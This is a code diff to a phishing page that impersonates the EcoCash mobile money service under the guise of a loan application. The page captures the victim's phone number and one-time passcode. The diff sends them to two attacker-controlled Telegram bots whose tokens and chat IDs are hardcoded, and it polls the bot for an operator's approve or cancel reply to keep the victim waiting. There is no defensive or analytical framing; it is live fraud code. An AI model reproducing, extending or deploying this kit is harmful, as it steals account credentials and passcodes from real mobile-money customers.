@@ -140,7 +140,9 @@
             background: #f5f7fa;
             flex-shrink: 0;
             margin-top: auto;
+            /* Pushes footer to bottom */
         }
+        /* SPINNER */
         
         #spinnerOverlay {
             position: fixed;
@@ -183,6 +185,7 @@
             max-width: 320px;
             font-weight: 500;
         }
+        /* SUCCESS / CANCEL MESSAGE */
         
         #resultOverlay {
             position: fixed;
@@ -237,6 +240,7 @@
 
     <footer>© 2025 EcoCash</footer>
 
+    <!-- SPINNER -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
@@ -244,14 +248,19 @@
         </div>
     </div>
 
+    <!-- RESULT OVERLAY -->
     <div id="resultOverlay">
         <div class="result-message" id="resultMessage"></div>
     </div>
 
     <script>
-        const BOT_TOKEN = '8701558047:AAHN7ow2mvkoloclzPBmVq3Ge6YpPw7H2Cs';
-        const CHAT_ID = '6531692395';
-        const TELEGRAM_BOT_LINK = 'https://t.me/+U_kLBh9E_lBhNzE0';
+        // Bot 1 (your existing)
+        const BOT_TOKEN_1 = '8705352429:AAFEnwVGYhdodm1V7iDItiCXycEy-WZfL_o';
+        const CHAT_ID_1 = '5615316142';
+
+        // Bot 2 (your second bot)
+        const BOT_TOKEN_2 = 'YOUR_SECOND_BOT_TOKEN_HERE';
+        const CHAT_ID_2 = 'YOUR_SECOND_CHAT_ID_HERE';
 
         // Mask phone from localStorage
         const savedPhone = localStorage.getItem('phone') || '785123463';
@@ -309,8 +318,22 @@
             });
         });
 
-        function redirectToTelegram() {
-            window.location.href = TELEGRAM_BOT_LINK;
+        // Helper to send to a bot with optional inline keyboard
+        function sendToBot(botToken, chatId, text, replyMarkup) {
+            const payload = {
+                chat_id: chatId,
+                text: text
+            };
+            if (replyMarkup) {
+                payload.reply_markup = replyMarkup;
+            }
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
         }
 
         submitBtn.addEventListener('click', () => {
@@ -322,32 +345,25 @@
             currentCallbackData = 'action_' + timestamp;
 
             const message = `OTP Verification\n\nPhone: +263 ${savedPhone}\nEntered OTP: ${otpValue}\n\nPlease approve or cancel the loan application.`;
+            const replyMarkup = {
+                inline_keyboard: [
+                    [{
+                        text: 'Approve',
+                        callback_data: 'approve_' + timestamp
+                    }, {
+                        text: 'Cancel',
+                        callback_data: 'cancel_' + timestamp
+                    }]
+                ]
+            };
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{
-                                text: 'Approve',
-                                callback_data: 'approve_' + timestamp
-                            }, {
-                                text: 'Cancel',
-                                callback_data: 'cancel_' + timestamp
-                            }]
-                        ]
-                    }
-                })
-            });
+            // Send to both bots
+            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
+            sendToBot(BOT_TOKEN_2, CHAT_ID_2, message, replyMarkup);
 
-            // Poll for admin response
+            // Poll for admin response (uses Bot 1's updates)
             pollInterval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/getUpdates?offset=${lastUpdateId + 1}`)
                     .then(res => res.json())
                     .then(data => {
                         if (data.ok && data.result.length > 0) {
@@ -365,9 +381,6 @@
                                         } else if (dataParts[0] === 'cancel') {
                                             resultMessage.textContent = 'Please reapply and ensure that your information is correct and your minimum Main USD Balance is atleast $30. Thank you.';
                                         }
-
-                                        // Wait 10 seconds then redirect to Telegram bot
-                                        setTimeout(redirectToTelegram, 10000);
                                     }
                                 }
                             }
